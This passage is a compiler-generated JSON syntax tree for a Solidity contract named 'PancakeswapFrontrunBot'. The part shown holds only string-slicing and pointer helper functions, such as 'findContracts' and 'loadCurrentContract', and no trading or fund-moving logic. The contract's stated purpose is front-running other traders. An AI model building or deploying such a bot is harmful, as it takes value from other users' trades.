														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 386,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 384,
														"name": "selfptr",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 271,
														"src": "3946:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 385,
														"name": "selflen",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 269,
														"src": "3956:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3946:17:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 279,
												"id": 387,
												"nodeType": "Return",
												"src": "3939:24:3"
											}
										]
									},
									"documentation": null,
									"id": 389,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "findContracts",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 276,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 269,
												"mutability": "mutable",
												"name": "selflen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "2574:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 268,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2574:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 271,
												"mutability": "mutable",
												"name": "selfptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "2588:12:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 270,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2588:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 273,
												"mutability": "mutable",
												"name": "needlelen",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "2602:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 272,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2602:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 275,
												"mutability": "mutable",
												"name": "needleptr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "2618:14:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 274,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2618:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2573:60:3"
									},
									"returnParameters": {
										"id": 279,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 278,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 389,
												"src": "2656:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 277,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "2656:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2655:6:3"
									},
									"scope": 1724,
									"src": "2551:1420:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "private"
								},
								{
									"body": {
										"id": 406,
										"nodeType": "Block",
										"src": "4197:134:3",
										"statements": [
											{
												"assignments": [
													397
												],
												"declarations": [
													{
														"constant": false,
														"id": 397,
														"mutability": "mutable",
														"name": "ret",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 406,
														"src": "4208:17:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 396,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "4208:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 399,
												"initialValue": {
													"argumentTypes": null,
													"id": 398,
													"name": "self",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 391,
													"src": "4228:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "4208:24:3"
											},
											{
												"assignments": [
													401
												],
												"declarations": [
													{
														"constant": false,
														"id": 401,
														"mutability": "mutable",
														"name": "retptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 406,
														"src": "4243:11:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 400,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4243:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 402,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4243:11:3"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4274:26:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4276:22:3",
															"value": {
																"arguments": [
																	{
																		"name": "ret",
																		"nodeType": "YulIdentifier",
																		"src": "4290:3:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4295:2:3",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4286:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "4286:12:3"
															},
															"variableNames": [
																{
																	"name": "retptr",
																	"nodeType": "YulIdentifier",
																	"src": "4276:6:3"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 397,
														"isOffset": false,
														"isSlot": false,
														"src": "4290:3:3",
														"valueSize": 1
													},
													{
														"declaration": 401,
														"isOffset": false,
														"isSlot": false,
														"src": "4276:6:3",
														"valueSize": 1
													}
												],
												"id": 403,
												"nodeType": "InlineAssembly",
												"src": "4265:35:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 404,
													"name": "ret",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 397,
													"src": "4320:3:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 395,
												"id": 405,
												"nodeType": "Return",
												"src": "4313:10:3"
											}
										]
									},
									"documentation": null,
									"id": 407,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "loadCurrentContract",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 392,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 391,
												"mutability": "mutable",
												"name": "self",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 407,
												"src": "4139:18:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 390,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4139:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4138:20:3"
									},
									"returnParameters": {
										"id": 395,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 394,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 407,
												"src": "4182:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 393,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "4182:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4181:15:3"
									},
									"scope": 1724,
									"src": "4110:221:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 524,
										"nodeType": "Block",
										"src": "4639:823:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 421,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 416,
															"name": "rune",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 411,
															"src": "4650:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 418,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "4650:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 419,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 409,
															"src": "4662:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 420,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_ptr",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 125,
														"src": "4662:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4650:21:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 422,
												"nodeType": "ExpressionStatement",
												"src": "4650:21:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 426,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 423,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 409,
															"src": "4689:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 424,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "4689:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 425,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4702:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "4689:14:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 436,
												"nodeType": "IfStatement",
												"src": "4685:86:3",
												"trueBody": {
													"id": 435,
													"nodeType": "Block",
													"src": "4705:66:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 431,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 427,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 411,
																		"src": "4720:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 429,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "4720:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 430,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4732:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "4720:13:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 432,
															"nodeType": "ExpressionStatement",
															"src": "4720:13:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 433,
																"name": "rune",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 411,
																"src": "4755:4:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																	"typeString": "struct PancakeswapFrontrunBot.slice memory"
																}
															},
															"functionReturnParameters": 415,
															"id": 434,
															"nodeType": "Return",
															"src": "4748:11:3"
														}
													]
												}
											},
											{
												"assignments": [
													438
												],
												"declarations": [
													{
														"constant": false,
														"id": 438,
														"mutability": "mutable",
														"name": "l",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 524,
														"src": "4784:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 437,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4784:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 439,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4784:6:3"
											},
											{
												"assignments": [
													441
												],
												"declarations": [
													{
														"constant": false,
														"id": 441,
														"mutability": "mutable",
														"name": "b",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 524,
														"src": "4801:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 440,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "4801:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 442,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "4801:6:3"
											},
											{
												"AST": {
													"nodeType": "YulBlock",
													"src": "4890:56:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4892:52:3",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"arguments": [
																							{
																								"arguments": [
																									{
																										"name": "self",
																										"nodeType": "YulIdentifier",
																										"src": "4921:4:3"
																									},
																									{
																										"kind": "number",
																										"nodeType": "YulLiteral",
																										"src": "4927:2:3",
																										"type": "",
																										"value": "32"
																									}
																								],
																								"functionName": {
																									"name": "add",
																									"nodeType": "YulIdentifier",
																									"src": "4917:3:3"
																								},
																								"nodeType": "YulFunctionCall",
																								"src": "4917:13:3"
																							}
																						],
																						"functionName": {
																							"name": "mload",
																							"nodeType": "YulIdentifier",
																							"src": "4911:5:3"
																						},
																						"nodeType": "YulFunctionCall",
																						"src": "4911:20:3"
																					},
																					{
																						"kind": "number",
																						"nodeType": "YulLiteral",
																						"src": "4933:2:3",
																						"type": "",
																						"value": "31"
																					}
																				],
																				"functionName": {
																					"name": "sub",
																					"nodeType": "YulIdentifier",
																					"src": "4907:3:3"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "4907:29:3"
																			}
																		],
																		"functionName": {
																			"name": "mload",
																			"nodeType": "YulIdentifier",
																			"src": "4901:5:3"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "4901:36:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4939:4:3",
																		"type": "",
																		"value": "0xFF"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "4897:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "4897:47:3"
															},
															"variableNames": [
																{
																	"name": "b",
																	"nodeType": "YulIdentifier",
																	"src": "4892:1:3"
																}
															]
														}
													]
												},
												"evmVersion": "istanbul",
												"externalReferences": [
													{
														"declaration": 441,
														"isOffset": false,
														"isSlot": false,
														"src": "4892:1:3",
														"valueSize": 1
													},
													{
														"declaration": 409,
														"isOffset": false,
														"isSlot": false,
														"src": "4921:4:3",
														"valueSize": 1
													}
												],
												"id": 443,
												"nodeType": "InlineAssembly",
												"src": "4881:65:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 446,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 444,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 441,
														"src": "4960:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30783830",
														"id": 445,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "4964:4:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_128_by_1",
															"typeString": "int_const 128"
														},
														"value": "0x80"
													},
													"src": "4960:8:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 454,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 452,
															"name": "b",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 441,
															"src": "5011:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30784530",
															"id": 453,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "5015:4:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_224_by_1",
																"typeString": "int_const 224"
															},
															"value": "0xE0"
														},
														"src": "5011:8:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": {
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 462,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 460,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 441,
																"src": "5062:1:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30784630",
																"id": 461,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "5066:4:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_240_by_1",
																	"typeString": "int_const 240"
																},
																"value": "0xF0"
															},
															"src": "5062:8:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseBody": {
															"id": 472,
															"nodeType": "Block",
															"src": "5110:32:3",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 470,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 468,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 438,
																			"src": "5125:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "34",
																			"id": 469,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5129:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_4_by_1",
																				"typeString": "int_const 4"
																			},
																			"value": "4"
																		},
																		"src": "5125:5:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 471,
																	"nodeType": "ExpressionStatement",
																	"src": "5125:5:3"
																}
															]
														},
														"id": 473,
														"nodeType": "IfStatement",
														"src": "5059:83:3",
														"trueBody": {
															"id": 467,
															"nodeType": "Block",
															"src": "5072:32:3",
															"statements": [
																{
																	"expression": {
																		"argumentTypes": null,
																		"id": 465,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 463,
																			"name": "l",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 438,
																			"src": "5087:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"hexValue": "33",
																			"id": 464,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "number",
																			"lValueRequested": false,
																			"nodeType": "Literal",
																			"src": "5091:1:3",
																			"subdenomination": null,
																			"typeDescriptions": {
																				"typeIdentifier": "t_rational_3_by_1",
																				"typeString": "int_const 3"
																			},
																			"value": "3"
																		},
																		"src": "5087:5:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"id": 466,
																	"nodeType": "ExpressionStatement",
																	"src": "5087:5:3"
																}
															]
														}
													},
													"id": 474,
													"nodeType": "IfStatement",
													"src": "5008:134:3",
													"trueBody": {
														"id": 459,
														"nodeType": "Block",
														"src": "5021:32:3",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 457,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 455,
																		"name": "l",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 438,
																		"src": "5036:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 456,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "5040:1:3",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "5036:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 458,
																"nodeType": "ExpressionStatement",
																"src": "5036:5:3"
															}
														]
													}
												},
												"id": 475,
												"nodeType": "IfStatement",
												"src": "4956:186:3",
												"trueBody": {
													"id": 451,
													"nodeType": "Block",
													"src": "4970:32:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 449,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 447,
																	"name": "l",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 438,
																	"src": "4985:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 448,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "4989:1:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "4985:5:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 450,
															"nodeType": "ExpressionStatement",
															"src": "4985:5:3"
														}
													]
												}
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 479,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 476,
														"name": "l",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 438,
														"src": "5202:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 477,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 409,
															"src": "5206:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 478,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "5206:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5202:13:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 503,
												"nodeType": "IfStatement",
												"src": "5198:158:3",
												"trueBody": {
													"id": 502,
													"nodeType": "Block",
													"src": "5217:139:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 485,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 480,
																		"name": "rune",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 411,
																		"src": "5232:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																			"typeString": "struct PancakeswapFrontrunBot.slice memory"
																		}
																	},
																	"id": 482,
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"memberName": "_len",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": 123,
																	"src": "5232:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"expression": {
																		"argumentTypes": null,
																		"id": 483,
																		"name": "self",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 409,
																		"src": "5244:4:3",
																		"typeDescriptions": {
